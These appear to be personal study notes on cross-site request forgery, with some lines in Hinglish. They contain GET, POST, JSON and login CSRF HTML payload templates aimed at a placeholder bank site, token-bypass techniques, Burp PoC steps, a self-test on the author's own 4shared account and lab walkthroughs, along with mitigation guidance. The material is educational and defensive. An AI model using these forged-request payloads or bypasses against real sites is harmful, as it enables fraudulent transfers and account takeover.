CSRF(client side request forgery)

- Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker is choosing.

 - ==Attacker tricks authenticated user into performing unwanted actions on a web application without their knowledge==

## Why this vulnerability arise:

1. ==CSRF vulnerabilities occur when vulnerable web apps simply trust the cookies sent by web browsers without further validation. if there is no same site cookie with secure.==
2. ==OTP is not required to update details (email, phone no. etc).==


### Working Flow
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         CSRF ATTACK FLOW                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Step 1: Victim logs into bank.com                                         │
│           ┌─────────┐    Login     ┌─────────────┐                          │
│           │ Victim  │─────────────▶│  bank.com   │                          │
│           └─────────┘              └─────────────┘                          │
│                │                          │                                 │
│                │◀─────────────────────────│                                 │
│                │    Session Cookie        │                                 │
│                                                                             │
│   Step 2: Victim visits attacker's site (still logged into bank)            │
│           ┌─────────┐              ┌─────────────┐                          │
│           │ Victim  │─────────────▶│  evil.com   │                          │
│           └─────────┘              └─────────────┘                          │
│                                           │                                 │
│   Step 3: Attacker's site contains hidden form/request                      │
│           ┌─────────────────────────────────────────────┐                   │
│           │ <img src="bank.com/transfer?to=attacker     │                   │
│           │            &amount=10000">                  │                   │
│           └─────────────────────────────────────────────┘                   │
│                                                                             │
│   Step 4: Victim's browser sends request with session cookie                │
│           ┌─────────┐   Request + Cookie   ┌─────────────┐                  │
│           │ Victim  │─────────────────────▶│  bank.com   │                  │
│           └─────────┘                      └─────────────┘                  │
│                                                   │                         │
│   Step 5: Bank processes request (thinks it's legitimate)                   │
│           $10,000 transferred to attacker!                                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```


### Impact of CSRF
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                            CSRF IMPACT                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   SEVERITY: Medium to Critical (depends on affected functionality)          │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   1. Financial Loss                                                         │
│      ├── Simple: Money transferred to attacker                              │
│      └── Technical: Unauthorized financial transactions executed            │
│                     via victim's authenticated session                      │
│                                                                             │
│   2. Account Takeover                                                       │
│      ├── Simple: Attacker takes control of victim's account                 │
│      └── Technical: Email/password changed → attacker gains                 │
│                     persistent access, victim locked out                    │
│                                                                             │
│   3. Data Modification                                                      │
│      ├── Simple: Victim's data changed without consent                      │
│      └── Technical: Profile, settings, preferences modified                 │
│                     through forged state-changing requests                  │
│                                                                             │
│   4. Privilege Escalation                                                   │
│      ├── Simple: Attacker gains higher access                               │
│      └── Technical: Admin tricked into creating attacker                    │
│                     admin account or elevating permissions                  │
│                                                                             │
│   5. Reputation Damage                                                      │
│      ├── Simple: Embarrassing content posted as victim                      │
│      └── Technical: Social media posts, messages sent                       │
│                     via victim's authenticated session                      │
│                                                                             │
│   6. Data Theft (Indirect)                                                  │
│      ├── Simple: Attacker accesses victim's data                            │
│      └── Technical: Email changed to attacker's → password reset            │
│                     → full account access → data exfiltration               │
│                                                                             │
│   7. Malware Distribution                                                   │
│      ├── Simple: Victim unknowingly spreads malware                         │
│      └── Technical: CSRF used to post malicious links/files                 │
│                     on victim's behalf to trusted platforms                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

```
┌─────────────────────────┬────────────────┬─────────────────────────────────┐
│ Action                  │ Severity       │ Impact                          │
├─────────────────────────┼────────────────┼─────────────────────────────────┤
│ Password Change         │ Critical       │ Full account takeover           │
│ Email Change            │ Critical       │ Account recovery hijack         │
│ Money Transfer          │ Critical       │ Direct financial loss           │
│ Admin User Creation     │ Critical       │ Complete system compromise      │
│ Delete Account/Data     │ High           │ Permanent data loss             │
│ Change Settings         │ Medium         │ Privacy/security degradation    │
│ Post Content            │ Medium         │ Reputation damage               │
│ Follow/Unfollow         │ Low            │ Minor annoyance                 │
└─────────────────────────┴────────────────┴─────────────────────────────────┘
```

## CSRF Attack Types Or Injection Points
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         CSRF ATTACK TYPES                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   1. GET-Based CSRF                                                         │
│      ├── Uses <img>, <iframe>, <script> tags                                │
│      ├── Simple URL with parameters                                         │
│      └── <img src="http://bank.com/transfer?to=attacker&amount=1000">       │
│                                                                             │
│   2. POST-Based CSRF                                                        │
│      ├── Uses hidden forms with auto-submit                                 │
│      ├── More common for sensitive actions                                  │
│      └── Requires JavaScript or user interaction                            │
│                                                                             │
│   3. JSON-Based CSRF                                                        │
│      ├── Targets API endpoints accepting JSON                               │
│      ├── Uses form with enctype="text/plain"                                │
│      └── Limited by Content-Type restrictions                               │
│                                                                             │
│   4. Login CSRF                                                             │
│      ├── Forces victim to login as attacker                                 │
│      ├── Victim's actions recorded in attacker's account                    │
│      └── Often overlooked vulnerability                                     │
│                                                                             │
│   5. Stored CSRF (via XSS)                                                  │
│      ├── CSRF payload stored in vulnerable site                             │
│      ├── Affects all users who view the content                             │
│      └── More dangerous - no external site needed                           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

- but not header based not cookies based (because user do not  have cookie access).

- `http://abcd.com/user/delete?id=123` (Agar victim is par click karega, to uska account delete ho jayega).

### 1. GET-Based CSRF
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         GET-BASED CSRF                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Simple: Action performed via URL (no form needed)                         │
│                                                                             │
│   Technical: Exploits endpoints that use GET for state-changing             │
│              operations, violating HTTP method semantics                    │
│                                                                             │
│   Example:                                                                  │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                                                                     │   │
│   │   <!-- Hidden image triggers request -->                            │   │
│   │   <img src="http://bank.com/transfer?to=attacker&amount=10000"      │   │
│   │        width="0" height="0">                                        │   │
│   │                                                                     │   │
│   │   <!-- Hidden iframe -->                                            │   │
│   │   <iframe src="http://bank.com/delete?id=123"                       │   │
│   │           style="display:none"></iframe>                            │   │
│   │                                                                     │   │
│   │   <!-- Clickable link -->                                           │   │
│   │   <a href="http://bank.com/transfer?to=attacker&amount=5000">       │   │
│   │      Click to claim prize!                                          │   │
│   │   </a>                                                              │   │
│   │                                                                     │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   Why it works: Browser automatically sends cookies with request            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

```HTML
<!-- Simple image tag -->
<img src="http://bank.com/transfer?to=attacker&amount=10000" width="0" height="0">

<!-- Hidden iframe -->
<iframe src="http://bank.com/transfer?to=attacker&amount=10000" style="display:none"></iframe>

<!-- Script tag -->
<script src="http://bank.com/transfer?to=attacker&amount=10000"></script>

<!-- Link (requires click) -->
<a href="http://bank.com/transfer?to=attacker&amount=10000">Click for Prize!</a>
```

### 2. POST-Based CSRF
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         POST-BASED CSRF                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Simple: Hidden form auto-submits when victim visits page                  │
│                                                                             │
│   Technical: Uses HTML form with method="POST" and JavaScript               │
│              auto-submit to send forged POST request                        │
│                                                                             │
│   Example:                                                                  │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                                                                     │   │
│   │   <html>                                                            │   │
│   │   <body onload="document.forms[0].submit()">                        │   │
│   │                                                                     │   │
│   │     <form action="http://bank.com/transfer" method="POST">          │   │
│   │       <input type="hidden" name="to" value="attacker">              │   │
│   │       <input type="hidden" name="amount" value="10000">             │   │
│   │     </form>                                                         │   │
│   │                                                                     │   │
│   │   </body>                                                           │   │
│   │   </html>                                                           │   │
│   │                                                                     │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   Why it works: Form submission carries session cookies automatically       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

```HTML
<!-- Auto-submitting form -->
<html>
<body onload="document.forms[0].submit()">
  <form action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
</html>
```

```HTML
<!-- With JavaScript -->
<html>
<body>
  <form id="csrfForm" action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>
```

### 3. JSON-Based CSRF
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         JSON-BASED CSRF                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Simple: Tricks API endpoints that expect JSON data                        │
│                                                                             │
│   Technical: Uses enctype="text/plain" to send JSON-like                    │
│              data via HTML form, bypassing CORS preflight                   │
│                                                                             │
│   Example:                                                                  │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                                                                     │   │
│   │   <form action="http://api.bank.com/transfer"                       │   │
│   │         method="POST"                                               │   │
│   │         enctype="text/plain">                                       │   │
│   │                                                                     │   │
│   │     <input name='{"to":"attacker","amount":"10000","x":"'           │   │
│   │            value='"}'>                                              │   │
│   │                                                                     │   │
│   │   </form>                                                           │   │
│   │                                                                     │   │
│   │   <!-- Sends: {"to":"attacker","amount":"10000","x":"="} -->        │   │
│   │                                                                     │   │
│   │   <script>document.forms[0].submit();</script>                      │   │
│   │                                                                     │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   Limitation: Only works if server accepts text/plain Content-Type          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

```HTML
<!-- Using enctype="text/plain" -->
<form action="http://api.bank.com/transfer" method="POST" enctype="text/plain">
  <input name='{"to":"attacker","amount":"10000","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>

<!-- Results in body:
{"to":"attacker","amount":"10000","ignore":"="}
-->
```


### 4. Login CSRF
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           LOGIN CSRF                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Simple: Forces victim to login as attacker's account                      │
│                                                                             │
│   Technical: Submits login form with attacker's credentials,                │
│              victim's subsequent actions are in attacker's account          │
│                                                                             │
│   Example:                                                                  │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                                                                     │   │
│   │   <form action="http://target.com/login" method="POST">             │   │
│   │     <input type="hidden" name="username" value="attacker">          │   │
│   │     <input type="hidden" name="password" value="attackerpass">      │   │
│   │   </form>                                                           │   │
│   │                                                                     │   │
│   │   <script>document.forms[0].submit();</script>                      │   │
│   │                                                                     │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   Attack Scenario:                                                          │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                                                                     │   │
│   │   1. Victim visits attacker's page                                  │   │
│   │   2. Auto-login to attacker's account                               │   │
│   │   3. Victim adds credit card (thinking it's their account)          │   │
│   │   4. Attacker now has victim's card in their account!               │   │
│   │                                                                     │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

```HTML
<!-- Force victim to login as attacker -->
<form action="http://target.com/login" method="POST">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="password" value="attackerpass">
</form>
<script>document.forms[0].submit();</script>

<!-- Now victim's actions are in attacker's account -->
```

## Mitigation
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          CSRF MITIGATION                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   1. CSRF Tokens (Anti-CSRF Tokens)                                         │
│                                                                             │
│   2. SameSite Cookie Attribute                                              │
│                                                                             │
│   3. Origin/Referer Header Validation                                       │
│                                                                             │
│   4. Custom Request Headers                                                 │
│                                                                             │
│   5. Double Submit Cookie                                                   │
│                                                                             │
│   6. Re-authentication                                                      │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

```
┌─────────────────────────────────────────────────────────────────┐
│              CSRF PROTECTION CHEAT SHEET                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ 1. CSRF TOKENS                          [MOST COMMON]     │  │
│  ├───────────────────────────────────────────────────────────┤  │
│  │                                                           │  │
│  │  HOW IT WORKS:                                            │  │
│  │  ─────────────                                            │  │
│  │  Server generates random token → Stores in session        │  │
│  │  → Embeds in form → Validates on submit                   │  │
│  │                                                           │  │
│  │  IMPLEMENTATION:                                          │  │
│  │  ───────────────                                          │  │
│  │  // Generate (once per session)                           │  │
│  │  $_SESSION['csrf'] = bin2hex(random_bytes(32));           │  │
│  │                                                           │  │
│  │  // Embed in form                                         │  │
│  │  <input type="hidden" name="csrf"                         │  │
│  │         value="<?= $_SESSION['csrf'] ?>">                 │  │
│  │                                                           │  │
│  │  // Validate                                              │  │
│  │  if (!hash_equals($_SESSION['csrf'], $_POST['csrf']))     │  │
│  │      → REJECT                                             │  │
│  │                                                           │  │
│  │  ✓ USE: All HTML form submissions                         │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ 2. SAMESITE COOKIE                      [EASIEST]         │  │
│  ├───────────────────────────────────────────────────────────┤  │
│  │                                                           │  │
│  │  JUST ADD THIS TO YOUR SESSION COOKIE:                    │  │
│  │  ─────────────────────────────────────                    │  │
│  │  Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly  │  │
│  │                                                           │  │
│  │  OPTIONS:                                                 │  │
│  │  ────────                                                 │  │
│  │  Strict → Never sent cross-site (most secure)             │  │
│  │  Lax    → Sent on navigation GET only (recommended)       │  │
│  │  None   → Always sent (need Secure flag, avoid if can)    │  │
│  │                                                           │  │
│  │  ✓ USE: Always. It's free protection.                     │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ 3. ORIGIN/REFERER CHECK                 [SIMPLE]          │  │
│  ├───────────────────────────────────────────────────────────┤  │
│  │                                                           │  │
│  │  CHECK WHERE REQUEST CAME FROM:                           │  │
│  │  ──────────────────────────────                           │  │
│  │  const origin = req.headers.origin;                       │  │
│  │                                                           │  │
│  │  if (origin !== 'https://mysite.com') → REJECT            │  │
│  │                                                           │  │
│  │  ⚠ CAVEAT: Some browsers/tools strip these headers        │  │
│  │                                                           │  │
│  │  ✓ USE: As additional layer, not sole protection          │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ 4. CUSTOM HEADER                        [FOR APIs]        │  │
│  ├───────────────────────────────────────────────────────────┤  │
│  │                                                           │  │
│  │  REQUIRE A CUSTOM HEADER ON ALL REQUESTS:                 │  │
│  │  ────────────────────────────────────────                 │  │
│  │  // Client                                                │  │
│  │  fetch('/api/action', {                                   │  │
│  │    headers: { 'X-Requested-With': 'XMLHttpRequest' }      │  │
│  │  });                                                      │  │
│  │                                                           │  │
│  │  // Server                                                │  │
│  │  if (!req.headers['x-requested-with']) → REJECT           │  │
│  │                                                           │  │
│  │  WHY: HTML forms can't add custom headers                 │  │
│  │                                                           │  │
│  │  ✓ USE: AJAX/API endpoints only                           │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ 5. DOUBLE SUBMIT COOKIE                 [STATELESS]       │  │
│  ├───────────────────────────────────────────────────────────┤  │
│  │                                                           │  │
│  │  TOKEN IN TWO PLACES - MUST MATCH:                        │  │
│  │  ───────────────────────────────────                      │  │
│  │  Cookie: csrf=abc123  ──┐                                 │  │
│  │                         ├── Must match!                   │  │
│  │  Header: X-CSRF: abc123 ┘                                 │  │
│  │                                                           │  │
│  │  // Server check                                          │  │
│  │  if (req.cookies.csrf !== req.headers['x-csrf'])          │  │
│  │      → REJECT                                             │  │
│  │                                                           │  │
│  │  WHY: Attacker can't read victim's cookies                │  │
│  │                                                           │  │
│  │  ✓ USE: When you can't store server-side sessions         │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ 6. RE-AUTHENTICATION                    [CRITICAL OPS]    │  │
│  ├───────────────────────────────────────────────────────────┤  │
│  │                                                           │  │
│  │  ASK FOR PASSWORD AGAIN BEFORE:                           │  │
│  │  ──────────────────────────────                           │  │
│  │  • Changing password/email                                │  │
│  │  • Money transfers                                        │  │
│  │  • Deleting account                                       │  │
│  │  • Adding payment methods                                 │  │
│  │                                                           │  │
│  │  // Simple check                                          │  │
│  │  if (!verifyPassword(currentPassword)) → REJECT           │  │
│  │  // Then proceed with action                              │  │
│  │                                                           │  │
│  │  ✓ USE: High-risk operations (defense in depth)           │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│                     QUICK DECISION GUIDE                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Building a website with forms?                                 │
│  → CSRF Tokens + SameSite Cookie                                │
│                                                                 │
│  Building an API?                                               │
│  → Custom Header + SameSite Cookie                              │
│                                                                 │
│  Stateless/JWT app?                                             │
│  → Double Submit Cookie + Custom Header                         │
│                                                                 │
│  Sensitive operations?                                          │
│  → All above + Re-authentication                                │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│                      MINIMUM PROTECTION                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  AT BARE MINIMUM, ALWAYS DO THESE:                              │
│                                                                 │
│  ┌────────────────────────────────────────────────────────┐     │
│  │ 1. SameSite=Lax on all cookies (it's one line!)        │     │
│  │ 2. CSRF tokens on forms OR custom headers on APIs      │     │
│  │ 3. Re-auth for password changes and money transfers    │     │
│  └────────────────────────────────────────────────────────┘     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## Real world scenario
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      CSRF ATTACK SCENARIOS                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   1. Money Transfer                                                         │
│      └── Transfer funds to attacker's account                               │
│                                                                             │
│   2. Password Change                                                        │
│      └── Change victim's password to attacker's known password              │
│                                                                             │
│   3. Email Change                                                           │
│      └── Change email → Reset password → Account takeover                   │
│                                                                             │
│   4. Admin Actions                                                          │
│      ├── Create new admin user                                              │
│      ├── Delete users                                                       │
│      └── Change settings                                                    │
│                                                                             │
│   5. Social Media                                                           │
│      ├── Post content                                                       │
│      ├── Follow/unfollow                                                    │
│      ├── Send messages                                                      │
│      └── Change privacy settings                                            │
│                                                                             │
│   6. E-commerce                                                             │
│      ├── Add items to cart                                                  │
│      ├── Change shipping address                                            │
│      └── Make purchases                                                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```


##  BYPASS TECHNIQUES   
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      CSRF BYPASS TECHNIQUES                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   1. Missing Token Validation                                               │
│      ├── Remove token parameter completely                                  │
│      └── Server might not check if token exists                             │
│                                                                             │
│   2. Token Not Tied to Session                                              │
│      ├── Use another user's valid token                                     │
│      └── Tokens are valid across different sessions                         │
│                                                                             │
│   3. Token in Cookie (Double Submit Bypass)                                 │
│      ├── If vulnerable to cookie injection                                  │
│      └── Set matching cookie and parameter                                  │
│                                                                             │
│   4. Weak Token Generation                                                  │
│      ├── Predictable tokens (timestamp, sequential)                         │
│      └── Short tokens (brute-forceable)                                     │
│                                                                             │
│   5. Token Leakage                                                          │
│      ├── Token in URL (Referer header)                                      │
│      └── Token logged or cached                                             │
│                                                                             │
│   6. Method Override                                                        │
│      ├── POST required but GET works                                        │
│      ├── _method=POST parameter                                             │
│      └── X-HTTP-Method-Override header                                      │
│                                                                             │
│   7. Content-Type Manipulation                                              │
│      ├── Change application/json to text/plain                              │
│      └── Server accepts different content types                             │
│                                                                             │
│   8. Subdomain Token Sharing                                                │
│      ├── Token valid across subdomains                                      │
│      └── XSS on subdomain can steal token                                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```



## how to exploit:

capture the request by burp use engagement tool > generate csrf PoC and save file as csrf.html.

## testing on 4shared.com(using own account)

1. go to profile and edit profile page.
2. check for samesite will set to none (in inspect-storage-samesite) if set to none and secure set to false then there are chances of vulnerability.
3. capture the edit page request on burpsuite and use engagement tools-generate poc
4. edit the changes in field of names/email etc and save the code in .html format.
5. open the .html file (on web automatically) and submit the request. (in real world we send this file to victim if victim submit the request then we can make changes to his account like email change/fund transfer etc.
6. now refresh the edit page tab the changes will show there.

## ==We can try by removing csrf token or can change digit its occurs when server not checking CSRF token correctly==

## ==Change GET to POST or POST to GET etc. occurs when server not checking csrf token correctly==


- **Relevant Action:** Application ke andar koi sensitive action hona chahiye (e.g., Email change karna, Password badalna, Fund transfer).
    
- **Cookie-Based Session Handling:** Application sirf session cookies par trust karti hai user ko identify karne ke liye.
    
- **No Unpredictable Request Parameters:** Request ke parameters attacker ko pehle se pata hone chahiye. (Jaise: `email=hacker@mail.com`). Agar wahan koi "Secret Token" nahi hai jise attacker guess na kar paye, to CSRF ho jayega



## Lab #1 - CSRF vulnerability with no defenses

Vulnerable parameter - email change functionality

Goal - exploit the CSRF vulnerability and change the email address
creds - wiener : peter

Analysis:
In order for a CSRF attack to be possible : These must be satisfied.

- A relevant action - email change functionality(without OTP or any other verification)

- Cookie based session handling - session cookie(have session id)

- No unpredictable request parameters - satisfied (means CSRF token is not bind or available here with email)

## Lab #2 CSRF Conditions for Lab 2 (Token validation depends on request method)

- **A Relevant Action:**
    
    - **Satisfied:** The application allows changing the email address (a sensitive action).
        
- **Cookie-based Session Handling:**
    
    - **Satisfied:** The application uses session cookies to identify the logged-in user.
        
- **No Unpredictable Request Parameters:**
    
    - **Satisfied (By Manipulation):**
        
        - Normally, there **is** an unpredictable parameter (the CSRF Token) in the `POST` request.
            
        - **However**, when we switch the request to `GET`, the server stops asking for the token.
            
        - Therefore, in the `GET` request, there are **no unpredictable parameters** left. The attacker can predict everything.



#### **GET (Retrieve Data)**

- **Purpose:** Used to request or fetch data from a specified resource.
    
- **Visibility:** Parameters are sent in the **URL** string. (e.g., `page.php?id=5`).
    
- **Security:** NOT secure for sensitive data (passwords) because data remains in browser history and logs.
    
- **Caching:** Can be cached by the browser.
    
- **Analogy:** Like a **Postcard** (Data is visible on the outside).


#### **POST (Submit Data)**

- **Purpose:** Used to send data to the server to create or update a resource (e.g., Login, Form Submit).
    
- **Visibility:** Parameters are sent in the **Request Body**, not the URL.
    
- **Security:** More secure than GET for sensitive inputs, but still needs HTTPS (encryption) to be truly safe.
    
- **Caching:** Not cached by default.
    
- **Analogy:** Like a **Sealed Envelope** (Data is hidden inside).



## Lab 3 - CSRF where token validation depends on token being present

- **A Relevant Action:**
    
    - **Satisfied:** The application allows changing the email address (a sensitive action).
        
- **Cookie-based Session Handling:**
    
    - **Satisfied:** The application uses session cookies to identify the logged-in user.
        
- **No Unpredictable Request Parameters:**
    
    - **Satisfied (By Manipulation):**
        
        - Normally, there **is** an unpredictable parameter (the CSRF Token) in the request.
            
        - **However**, the server only validates the token **if the parameter is present** in the request body.
            
        - **Therefore**, if we completely **remove** the `csrf` parameter (key and value) from the request, the validation is skipped. Since the attacker can send a form without this parameter, there are no unpredictable parameters left.



## Lab 4 - CSRF where token is not tied to the user session

- **A Relevant Action:**
    
    - **Satisfied:** The application allows changing the email address.
        
- **Cookie-based Session Handling:**
    
    - **Satisfied:** The application uses session cookies to identify the user.
        
- **No Unpredictable Request Parameters:**
    
    - **Satisfied (By Swapping):**
        
        - Normally, the CSRF token is unpredictable to the attacker because they don't know the _victim's_ token.
            
        - **However**, the application accepts **any** valid token issued by the server, even if it belongs to a different user.
            
        - **Therefore**, the attacker can log in with their own account, obtain a valid token (which is known/predictable to them), and inject this token into the exploit. The server accepts this "borrowed" token as valid proof.

